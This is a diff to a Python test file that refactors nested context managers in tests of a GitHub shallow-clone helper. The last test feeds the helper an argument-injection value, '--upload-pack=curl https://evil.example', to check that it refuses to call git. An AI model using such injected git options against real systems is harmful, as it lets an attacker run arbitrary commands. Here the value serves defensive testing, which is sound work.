@@ -35,10 +35,9 @@ def test_clone_shallow_cleans_up_when_body_raises(monkeypatch):
     monkeypatch.setattr("secfoo.targets.github.subprocess.run", fake_run)
 
     captured: dict[str, Path] = {}
-    with pytest.raises(RuntimeError):
-        with clone_shallow("https://github.com/org/repo") as path:
-            captured["dir"] = path
-            raise RuntimeError("boom")
+    with pytest.raises(RuntimeError), clone_shallow("https://github.com/org/repo") as path:
+        captured["dir"] = path
+        raise RuntimeError("boom")
 
     assert not captured["dir"].exists()
 
@@ -49,9 +48,8 @@ def test_clone_shallow_raises_target_resolution_error_on_git_failure(monkeypatch
 
     monkeypatch.setattr("secfoo.targets.github.subprocess.run", fake_run)
 
-    with pytest.raises(TargetResolutionError):
-        with clone_shallow("https://github.com/org/nope"):
-            pass
+    with pytest.raises(TargetResolutionError), clone_shallow("https://github.com/org/nope"):
+        pass
 
 
 def test_clone_shallow_surfaces_disk_full_with_actionable_message(monkeypatch):
@@ -64,9 +62,8 @@ def test_clone_shallow_surfaces_disk_full_with_actionable_message(monkeypatch):
 
     monkeypatch.setattr("secfoo.targets.github.subprocess.run", fake_run)
 
-    with pytest.raises(TargetResolutionError, match="disk full"):
-        with clone_shallow("https://github.com/org/repo"):
-            pass
+    with pytest.raises(TargetResolutionError, match="disk full"), clone_shallow("https://github.com/org/repo"):
+        pass
 
 
 def test_clone_shallow_refuses_a_non_github_url_without_calling_git(monkeypatch):
@@ -74,6 +71,8 @@ def test_clone_shallow_refuses_a_non_github_url_without_calling_git(monkeypatch)
         "secfoo.targets.github.subprocess.run",
         lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("git must not run")),
     )
-    with pytest.raises(TargetResolutionError, match="refusing to clone"):
-        with clone_shallow("--upload-pack=curl https://evil.example"):
-            pass
+    with (
+        pytest.raises(TargetResolutionError, match="refusing to clone"),
+        clone_shallow("--upload-pack=curl https://evil.example"),
+    ):
+        pass
